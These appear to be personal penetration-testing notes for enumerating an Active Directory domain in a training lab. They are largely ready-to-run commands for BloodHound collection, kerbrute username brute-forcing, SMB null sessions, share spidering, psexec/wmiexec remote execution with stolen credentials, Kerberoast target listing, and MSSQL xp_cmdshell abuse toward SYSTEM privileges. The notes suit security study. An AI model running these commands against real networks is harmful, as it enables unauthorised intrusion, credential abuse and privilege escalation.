Requires Credentials from AD Breach
### Bloodhound AD Enum
``` bash
sudo bloodhound-python -u '<USERNAME>' -p '<PASSWD>' -ns <IP> -d <DOMAIN> -c all 
#run Neo4j
sudo neo4j start
#Open another terminal and run Bloodhound
#Creds: neo4j:kali
bloodhound --no-sandbox
#move zip to bloodhound to load


#WINDOWS HOST:
.\SharpHound.exe -c All --zipfilename <OUTPUT_FILE>
```
# Enumerate usernames
### Kerbrute for valid usernames
Bruteforce for valid usernames with common usernames wordlist
``` bash
kerbrute userenum -d <domain> --dc <IP> <username_list>
#ex:
#kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
#save valid usernames to file:
#cat res.txt | grep "[+]" | cut -d ' ' -f8 | cut -d "@" -f1 > valid_users.txt
```
### SMB NULL Session to Pull User Listen
3 different ways
``` bash
#enum4linux
enum4linux -U <IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

#rpcclient and enumdomusers
rpcclient -U "" -N <IP>
rpcclient $> enumdomusers 

#CrakMapExec
crackmapexec smb <IP> --users

```
### Gathering Users with LDAP Anonymous
``` powershell
#ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

#windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
### CrackMapExec with Valid Credentials
``` bash
#requires valid username and password of one AD user
#lists all user credentials and badpwdcount
sudo crackmapexec smb <IP-DC> -u <USERNAMWE> -p <PASSWORD> --users
#Domain Group Enumeration
sudo crackmapexec smb <IP-DC> -u <USERNAMWE> -p <PASSWORD> --groups
#Logged-on users
sudo crackmapexec smb <IP> -u <USERNAMWE> -p <PASSWORD> --loggedon-users
#available shares
sudo crackmapexec smb <IP-DC> -u <USERNAMWE> -p <PASSWORD> --shares
#dig through the share for readable files creates output to /tmp/cme_spider_plus/<IP>
sudo crackmapexec smb 172.16.5.5 -u <USERNAMWE> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
```
### SMBMap Shares
``` bash
#kali
#List shares and access
smbmap -u <USERNAME> -p <PASSWD> -d <DOMAIN> -H <IP>
#List share directories
smbmap -u <USERNAME> -p <PASSWD>2 -d <DOMAIN> -H <IP> -R '<SHARE>' --dir-only
```
# RPCClient
``` bash
#unauthenticated SMB NULL session with target
rpcclient -U "" -N <IP>
#Gather unique RIDs
enumdomusers
```
# Psexex.py
``` bash
#connect to host with psexe (requires local admin creds)
psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>  
```
### Wmiexec.py
``` bash
#Same as psexec? not sure when to use
wmiexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>  
```
# Credential Enumeration - Windows
### Powershell
``` powershell
Import-Module ActiveDirectory
#Basic information
Get-ADDomain
#List accounts that may be used in Kerberoasting attack
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName-
#Group enumeration
Get-ADGroup -Filter * | select name
#Get more info about specific group
Get-ADGroup -Identity "<GROUP>"
#Get group members
Get-ADGroupMember -Identity "<GROUP>"
```
# SQL Server Admin
SQL Server usually running on admin rights
``` bash
#Check with bloodhound script for sql admin rights:
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
#Login with impacket mssqlclient
#EX: mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
#enable `enable_xp_cmdshell` which allows to execute OS cmds via the Db if the account has the proper access rights.
enable_xp_cmdshell
#we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege], which can be leveraged in combination with a tool such as [JuicyPotato], [PrintSpoofer], or [RoguePotato] to escalate to `SYSTEM` level privileges
xp_cmdshell whoami /priv
```

# Powerview
``` Powershell
#ALLWAYS IMPORT-MODULE FIRST
Import-module .\PowerView.Ps1
#Remote Desktop Users Group
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```